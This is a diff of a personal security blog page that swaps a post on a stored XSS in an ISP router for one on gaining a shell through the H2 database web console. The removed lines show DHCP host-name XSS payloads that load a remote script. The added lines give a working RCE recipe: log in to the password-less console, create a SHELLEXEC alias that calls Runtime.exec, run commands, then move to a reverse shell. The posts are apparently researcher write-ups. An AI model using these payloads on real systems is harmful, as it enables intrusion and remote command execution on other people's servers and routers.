@@ -31,11 +31,11 @@
     <article class="post">
 
         <header class="post-header">
-            <h1 class="post-title">Hacking into NET router for fun and profit [FULL DISCLOSURE]</h1>
+            <h1 class="post-title">Abusing H2 Database ALIAS</h1>
             <section class="post-meta">
-                <time class="post-date" datetime="2018-03-02">02 Mar 2018</time>
+                <time class="post-date" datetime="2018-03-14">14 Mar 2018</time>
                 
-                    on Persistence
+                    on RCE
                 
             </section>
         </header>
@@ -49,80 +49,43 @@
         </header> -->
 
         <!-- <span class="post-meta">
-            <time datetime="2018-03-02">02 Mar 2018</time>
+            <time datetime="2018-03-14">14 Mar 2018</time>
             
-                on Persistence
+                on RCE
             
         </span> -->
 
-        <!-- <h1 class="post-title">Hacking into NET router for fun and profit [FULL DISCLOSURE]</h1> -->
+        <!-- <h1 class="post-title">Abusing H2 Database ALIAS</h1> -->
 
         <section class="post-content">
-            <h4 id="hacking-into-net-router-for-fun-and-profit-full-disclosure">Hacking into NET router for fun and profit [FULL DISCLOSURE]</h4>
-<p>Recently I moved to another city to live alone, and as needed I contract the only ISP available on my building, NET, one of the worst ISP on Brazil, they just decided to block all my output connections on port 22/ssh, but it’s another history.</p>
+            <h4 id="how-to-get-a-shell-on-a-h2-database-using-alias-feature">How to get a shell on a H2 Database, using ALIAS feature.</h4>
+<p>Today I was introduced to <a href="http://www.h2database.com">H2 Database</a>, a in-memory and pure Java Database, because it’s a in-memory database, the developers use it most to learning, unit tests and poc’s, but you can learn more about it on H2 <a href="2018-03-14-abusing-h2-database-alias.markdown">site</a>.</p>
 
-<p>I have an history pwning <a href="https://www.exploit-db.com/exploits/42284/">NET router</a>, and as I was bored today and decided to play around with my brand new net router.</p>
+<p>The H2 provides a web console, where you can manage your database, and here the things starts to be more interesting, by default it does not have an password set, so you can just log in, but what can we do inside it? The first thing I tried was the same trick that everyone knows on MySQL.</p>
 
-<p>The first thing I tried on that was an command injection on ping function. It didn’t work, but gave the output of what a sent, so I realized that was a lot of XSS possibilities on this router. The first place I tried, was on ping function again, but there was some control that did not allow me to sent especial characters, beyond that, it’s not a good place to get a XSS, I needed a XSS stored on this precious router, and then a divine light open my mind, and made me test the first page of the router, where they show the DHCP leases. This page contains host name, ip address and mac address of each host so I thought maybe I could manipulate the host name of my host and sent a malicious data. In a simple Google search, I realized that I just need to change one line on dhclient config file (/etc/dhcp/dhclient.conf)</p>
-
-<pre><code class="language-bash">send host-name = "&lt;script&gt;alert('HACKED')&lt;/script&gt;";
+<pre><code>SELECT 'SOME CONTENT' INTO OUTFILE '/tmp/saida.txt'
 </code></pre>
 
-<p>Sadly it didn’t work. I opened the html source and saw that the last character wasn’t there so I figured out that there was a limit on the host name size only 31 characters. Just to validate the XSS, I removed the HACKED string to force the lease and it works and then my saga started to get something more interesting then a alert().</p>
+<p>And of course it didn’t work, so I decided to be more smart and google it, trying to discover if anybody already find some RCE on it, and the maximum I found was a report made by the H2 Group on <a href="'https://www.securityfocus.com/bid/58536'">SecurityFocus</a>, but there wasn’t an available exploit or any technical detail.</p>
 
-<p>I created a payload.js and hosted it on a VPS and tried a lot of techniques to make the content of this file executed by the browser, but none of then worked. I got close using the site <a href="https://l.ly">l.ly</a> to short my url, but due the “XXX” character, it didn’t work.</p>
+<p>So after it I did the most obvious thing, open the H2 site, go to the documentation, and tried to find any interesting function, the first thing I found was the <a href="http://www.h2database.com/html/functions.html?highlight=FILE_READ&amp;search=FILE_#file_read">FILE_READ</a> function, where I can read files from filesystem, Ok, cool, it’s a nice thing to do, but it’s not a shell, so digging on SQL commands section, I found the <a href="http://www.h2database.com/html/grammar.html#create_alias">CREATE ALIAS</a>, basically, you can create an function on H2 that calls a java code, as the example</p>
 
-<pre><code class="language-bash">send host-name = "&lt;script src=//l.ly/uXa&gt;&lt;/script&gt;";
+<pre><code>CREATE ALIAS GET_SYSTEM_PROPERTY FOR "java.lang.System.getProperty";
+CALL GET_SYSTEM_PROPERTY('java.class.path');
+</code></pre>
+<p>or a more complex alias,</p>
+<pre><code>CREATE ALIAS REVERSE AS $$ String reverse(String s) { return new StringBuilder(s).reverse().toString(); } $$;
+CALL REVERSE('Test');
 </code></pre>
 
-<p>So I thought in buying a short domain like l.ly and host my payload file named as 1 and my problem would be resolved, but it’s extremely expensive and I don’t have money to do that. After hours thinking the best way to do that, I realized how stupid I am: the only thing I needed, is just another network interface, to create this output on the router.</p>
-
-<pre><code class="language-html">&lt;tr&gt;&lt;td&gt;10&lt;/td&gt;&lt;td&gt;&lt;script src=//l.ly/uXa&gt;&lt;!--&lt;/td&gt;&lt;td&gt;f4:96:34:25:65:c5&lt;/td&gt;&lt;td&gt;192.168.0.44&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;td&gt;10&lt;/td&gt;&lt;td&gt;--&gt;&lt;/script&gt;&lt;/td&gt;&lt;td&gt;f4:96:34:25:65:c5&lt;/td&gt;&lt;td&gt;192.168.0.44&lt;/td&gt;&lt;/tr&gt;
+<p>Now it’s game over, if I can execute Java code, I can get a shell, as I’m not a Java expert, I searchon Google a easy way to execute system commands with java, found a link on <a href="https://stackoverflow.com/a/20624914">stackoverflow</a>, I just adapted it inside the ALIAS, and now there’s a function that execute arbitrary code,</p>
+<pre><code>CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
+CALL SHELLEXEC('id')
 </code></pre>
 
-<p>I just splitted the payload on my 2 interfaces, the first interface receives the follow payload,</p>
+<p>After that just find if the server have any tool to do a <a href="https://github.com/mthbernardes/rsg">reverse shell</a>, and you’ll gain a interactive shell.</p>
 
-<pre><code class="language-bash">send host-name = "&lt;script src=//l.ly/uXa&gt;&lt;!--";
-</code></pre>
-
-<p>Where I have the start of the payload, and a HTML comment, to ignore everything after my tag script, and the second payload,</p>
-
-<pre><code class="language-bash">send host-name = "--&gt;&lt;/script&gt;";
-</code></pre>
-<p>I just closed the comment, and inserted the end of the tag script, I forced the interfaces to lease the ip address and request again, and then I finally got my XSS payload been executed.</p>
-
-<pre><code class="language-bash">dhclient -r &amp;&amp; dhclient
-</code></pre>
-
-<p><img src="/assets/images/router-hacked.png" alt="hacked" title="hacked" /></p>
-
-<h4 id="about-the-router">About the router</h4>
-<p>Below is information about the router</p>
-
-<table>
-  <thead>
-    <tr>
-      <th>Description</th>
-      <th style="text-align: right">Version</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>Technology</td>
-      <td style="text-align: right">docsis 3.0</td>
-    </tr>
-    <tr>
-      <td>Hardware Version</td>
-      <td style="text-align: right">V2.00</td>
-    </tr>
-    <tr>
-      <td>Software Version</td>
-      <td style="text-align: right">09.89.17.23.03</td>
-    </tr>
-  </tbody>
-</table>
-
+<p><img src="/assets/images/h2-console-rce.gif" alt="h2-console-rce" /></p>
 
         </section>
 
@@ -148,15 +111,15 @@
             <!-- Share links section -->
             <section class="share">
     <h4>Share this post</h4>
-    <a class="icon-twitter" href="http://twitter.com/share?text=Hacking into NET router for fun and profit [FULL DISCLOSURE]&amp;url=mthbernardes.github.io/persistence/2018/03/02/hacking-into-NET-router-for-fun-and-profit.html"
+    <a class="icon-twitter" href="http://twitter.com/share?text=Abusing H2 Database ALIAS&amp;url=mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html"
         onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
         <span class="hidden">Twitter</span>
     </a>
-    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=mthbernardes.github.io/persistence/2018/03/02/hacking-into-NET-router-for-fun-and-profit.html"
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html"
         onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
         <span class="hidden">Facebook</span>
     </a>
-    <a class="icon-google-plus" href="https://plus.google.com/share?url=mthbernardes.github.io/persistence/2018/03/02/hacking-into-NET-router-for-fun-and-profit.html"
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html"
        onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
         <span class="hidden">Google+</span>
     </a>
